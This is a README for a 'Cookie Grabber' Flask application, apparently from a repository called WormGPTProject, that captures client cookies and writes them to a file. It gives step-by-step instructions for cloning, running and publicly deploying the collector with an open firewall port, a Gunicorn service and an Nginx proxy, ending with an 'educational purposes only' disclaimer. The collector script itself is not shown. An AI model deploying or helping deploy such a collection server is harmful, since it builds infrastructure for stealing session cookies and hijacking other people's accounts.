

### Cookie Grabber


```markdown
# Cookie Grabber

## Overview

This repository contains a simple Flask application that captures cookies from a client and stores them in a file. This is intended for educational purposes only.

## Prerequisites

- Python 3.x
- Flask
- Gunicorn (for production deployment)
- Nginx (for production deployment)

## Installation

1. Clone the repository:

```bash
git clone https://github.com/Cyb3rN3xt/WormGPTProject.git
cd WormGPTProject
```

2. Install the required Python packages:

```bash
pip install -r requirements.txt
```

## Running Locally

To run the application locally, use:

```bash
python cookie_grabber.py
```

Access the application at `http://127.0.0.1:5000/`.

## Deploying on a Non-Local Server

1. **Access the Server**: SSH into your server.

```bash
ssh your_username@your_server_ip
```

2. **Install Python and Pip**:

```bash
sudo apt update
sudo apt install python3 python3-pip
```

3. **Install Flask**:

```bash
pip3 install flask
```

4. **Upload the Script**:

```bash
scp cookie_grabber.py your_username@your_server_ip:/path/to/destination
```

5. **Run the Script**:

```bash
cd /path/to/destination
python3 cookie_grabber.py
```

6. **Configure Firewall**:

```bash
sudo ufw allow 5000
```

7. **Access the Application**:

Access the application via `http://your_server_ip:5000/`.

## Production Deployment

### Using Gunicorn and Nginx

1. **Install Gunicorn**:

```bash
pip3 install gunicorn
```

2. **Create a Gunicorn service file**:

```bash
sudo nano /etc/systemd/system/cookie_grabber.service
```

Add the following content:

```ini
[Unit]
Description=Gunicorn instance to serve cookie grabber
After=network.target

[Service]
User=your_username
Group=www-data
WorkingDirectory=/path/to/destination
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind 0.0.0.0:5000 wsgi:app

[Install]
WantedBy=multi-user.target
```

3. **Create a WSGI entry point**:

In your project directory, create a file named `wsgi.py`:

```python
from cookie_grabber import app

if __name__ == "__main__":
    app.run()
```

4. **Start and enable the service**:

```bash
sudo systemctl start cookie_grabber
sudo systemctl enable cookie_grabber
```

5. **Configure Nginx**:

```bash
sudo apt install nginx
```

Create a new Nginx configuration file:

```bash
sudo nano /etc/nginx/sites-available/cookie_grabber
```

Add the following content:

```nginx
server {
    listen 80;
    server_name your_server_ip;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Enable the configuration and restart Nginx:

```bash
sudo ln -s /etc/nginx/sites-available/cookie_grabber /etc/nginx/sites-enabled
sudo nginx -t
sudo systemctl restart nginx
```

Your Flask app should now be accessible via `http://your_server_ip/`.

**Disclaimer**: This script is for educational purposes only. Capturing cookies without the owner's permission is illegal and unethical. Always use such tools responsibly and with proper authorization.
```
